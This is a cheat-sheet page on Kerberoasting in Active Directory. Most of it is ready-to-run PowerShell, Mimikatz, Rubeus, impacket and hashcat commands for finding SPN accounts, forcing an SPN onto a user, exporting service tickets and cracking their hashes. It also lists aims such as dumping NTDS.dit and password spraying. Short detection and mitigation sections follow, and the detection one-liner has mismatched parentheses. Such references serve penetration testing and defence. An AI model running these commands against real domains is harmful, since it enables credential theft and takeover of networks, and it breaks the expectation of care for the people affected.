---
title: "Kerberoasting"
description: "Privilege escalation using Kerberoasting."
lead: "Using Kerberoasting for privilege escalation in Active Directory with PowerView, Mimikatz, and Rubeus."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_privilege_escalation"
weight: 20
toc: true
---

## Overview

- Request service ticket for any service with registered SPN
- Use ticket to crack service password
- Use BloodHound to find Kerberoastable accounts
- If service is a domain admin we can gather loot and dump the NTDS.dit
- If not, you can use it to log into other systems and pivot or escalate
- Use cracked password for password spraying

## Exploitation

### Find Accounts with SPN

```powershell
# Windows built-in
setspn -T DOMAIN -Q ​*/*

# PowerView
Get-NetUser -SPN | Select -ExpandProperty serviceprincipalname

# AD Module
Get-ADUser -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrincipalName
```

### Force Set SPN

If we have enough rights on user (GenericAll/GenericWrite) we can set an SPN for a user then request a TGS for it for Kerberoasting.

```powershell
# Enumerate the permissions for RDPUsers on ACLs using PowerView 3.0/dev
# Enumerate the permissions for RDPUsers on ACLs using PowerView 3.0/dev
Invoke-ACLScanner -ResolveGUIDs | ?{ $_.IdentityReferenceName -match "RDPUsers" }

# Check if user already has a SPN
# Using PowerView 3.0
Get-DomainUser -Identity support572user | Select serviceprincipalname

# Using AD Module
Get-ADUser -Identity support572user -Properties ServicePrincipalName | Select ServicePrincipalName

# Set a SPN for the user (must be unique in domain)
# Using PowerView 3.0
Set-DomainObject -Identity support572user -Set @{serviceprincipalname="dcorp/bufusvc"}

# Using AD Module
Set-ADUser -Identity support572user -ServicePrincipalNames @{Add="dcorp/bufusvc"}
```

### Extracting Tickets

```powershell
# PowerShell built-in
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"

# PowerView
Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"

# Check if TGS has been granted
klist

# Extract tickets with mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'

python.exe .\tgsrepcrack.py .\10k-worst-pass.txt ".\1-40a10000-student572@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi"
```

### Extracting Hashes

```powershell
# Rubeus
# Find all kerberoastable users and save hashes to file
.\Rubeus.exe kerberoast /outfile:hashes.kirbi

# For specific SPN
.\Rubeus.exe kerberoast /spn:MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local /outfile:mssqlsvc.kirbi

# Using Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII ticket.kirbi

# Remotely with impacket
GetUserSPNs.py dcorp-dc/user:password -dc-ip 10.10.10.10 -request

# Crack hash with hashcat
hashcat -a 0 -m 13100 hash.txt rockyou.txt
```

## Detection

- Security event ID 4769: A Kerberos ticket was requested
- Filter results based on the following information from logs
  - Service name should not be krbtgt
  - Service name does not end with $ (to filter out machine accounts used for services)
  - Account name should not be machine@domain (to filter out requests from machines)
  - Failure code is '0x0' (to filter out failures, 0x0 is success)
  - Most importantly, ticket encryption type is 0x17

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split"`n")[8] -ne 'krbtgt' -and $_.Message.split"`n")[8] -ne '*$' -and $_.Message.split"`n")[3] -notlike '*$@*' -and $_.Message.split"`n")[18] -like '*0x0*' -and $_.Message.split"`n")[17] -like "*0x17*"} | Select -ExpandProperty message
```

## Mitigation

- Strong service account passwords
- Don't make service accounts domain admins
- Use Managed Service Accounts (Automatic change of password periodically and delegated SPN Management)
- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj128431(v=ws.11)
